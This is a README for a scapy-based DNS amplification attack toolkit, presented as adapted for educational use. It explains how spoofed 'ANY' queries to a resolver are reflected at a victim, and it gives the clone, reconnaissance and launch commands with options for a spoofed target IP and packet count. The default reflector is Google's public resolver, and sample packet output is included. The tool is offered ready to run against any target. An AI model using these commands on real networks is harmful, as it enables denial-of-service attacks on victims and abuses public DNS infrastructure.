DNS Amplification attack
===
Customization of the repository of tony2037
[github-Dns-Amplification-Attack](https://github.com/tony2037/Dns-Amplification-Attack)

Some adaptations have been made for easier deployment and more flexible use in an educational setting.

# How does it work ?
According to [DNS Amplification Attack](https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/) :

1. The attacker uses a compromised endpoint to send UDP packets with spoofed IP addresses to a DNS recursor. The spoofed address on the packets points to the real IP address of the victim.
2. Each one of the UDP packets makes a request to a DNS resolver, often passing an argument such as “ANY” in order to receive the largest response possible.
3. After receiving the requests, the DNS resolver, which is trying to be helpful by responding, sends a large response to the spoofed IP address.
4. The IP address of the target receives the response and the surrounding network infrastructure becomes overwhelmed with the deluge of traffic, resulting in a denial-of-service.

![](https://i.imgur.com/2LJ8JU4.png)

# Experience
## Explanation
This package is a standalone toolkit based on **python scapy** which send a **UDP/IP** packet carry a **DNS** packet with **DNS Resource Record** packet. The scapy library is included in the repository to ensure compatibility with virtually any host that can run Python. This also reduces the number of steps needed to get started.<br>
The default `destination` is `8.8.8.8`, which is well-known **google DNS server**.<br>
The default `target address` is local, but can be easily changed to any target in the arguments<br>

## Usage
### Clone repository
```shell
git clone https://github.com/Ezecheel/Dns-Amplification-Attack
```
### Reconnaissance to check amplification
```shell
sudo python DAA_recon.py -D _destination_IP_ -q _queryname_ -qt _id of query type_ -n _number of packets_
```
**destination_IP** is the IP address of the DNS server to which the request will be sent, default is 8.8.8.8<br>
**queryname** is the domainname for which the record will be requested, default is google.com<br>
**id of query type** is the id number of the record type that will be requested, default is 255 (ALL)<br>
**number of packets** is the number of DNS queries that should be sent as part of simulated attack, default is 1<br>

TYPE            value and meaning

A       1       a host address

NS      2       an authoritative name server

MD      3       a mail destination (Obsolete - use MX)

MF      4       a mail forwarder (Obsolete - use MX)

CNAME   5       the canonical name for an alias

SOA     6       marks the start of a zone of authority

MB      7       a mailbox domain name (EXPERIMENTAL)

MG      8       a mail group member (EXPERIMENTAL)

MR      9       a mail rename domain name (EXPERIMENTAL)

NULL    10      a null RR (EXPERIMENTAL)

WKS     11      a well known service description

PTR     12      a domain name pointer

HINFO   13      host information

MINFO   14      mailbox or mail list information

MX      15      mail exchange

TXT     16      text strings

for a more complete list see: https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml

The script outputs the amplification level of the requested record. This can be used to find suitable records for simulated attacks. Additionally, it is possible to sent a number of requests to ensure that the amplification level remains sufficiently high when the DNS server gets flooded with requests.
### Launch attack
```shell
sudo python DAA.py -D _destination_IP_ -T _target_IP_ -q _queryname_ -qt _id of query type_ -n _number of packets_
```
for **destination_IP**, **queryname**, **id of query type** and **number of packets** see above.<br>
**target_IP** is the IP address of the target machine to which the DNS replies should be sent, default is 127.0.0.1<br>

### Listen to DNS traffic
```shell
sudo python snifffer.py
```
This returns all DNS packets that are received on the interface, similar to a Wireshark capture filtered on DNS.
This can serve as an introduction to see which records are being requested and received, including which replies seem sufficiently large to be used as example.
### Snapshot //add snapshots
#### Send packet
```shell
         |###[ DNS Question Record ]### 
         |  qname     = 'qq.com'
         |  qtype     = ALL
         |  qclass    = IN
        an        = None
        ns        = None
        ar        = None

Are you sure you want to attack ? [Y]/NY
.
Sent 1 packets.
```
#### Sniffing
```shell
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 52
     id        = 1
     flags     = 
     frag      = 0
     ttl       = 64
     proto     = udp
     chksum    = 0x608a
     src       = 10.1.0.30
     dst       = 8.8.8.8
     \options   \
###[ UDP ]### 
        sport     = domain
        dport     = domain
        len       = 32
        chksum    = 0x9f30
###[ DNS ]### 
           id        = 0
           qr        = 0
           opcode    = QUERY
           aa        = 0
           tc        = 0
           rd        = 1
           ra        = 0
           z         = 0
           ad        = 0
           cd        = 0
           rcode     = ok
           qdcount   = 1
           ancount   = 0
           nscount   = 0
           arcount   = 0
           \qd        \
            |###[ DNS Question Record ]### 
            |  qname     = 'qq.com.'
            |  qtype     = ALL
            |  qclass    = IN
           an        = None
           ns        = None
           ar        = None
```
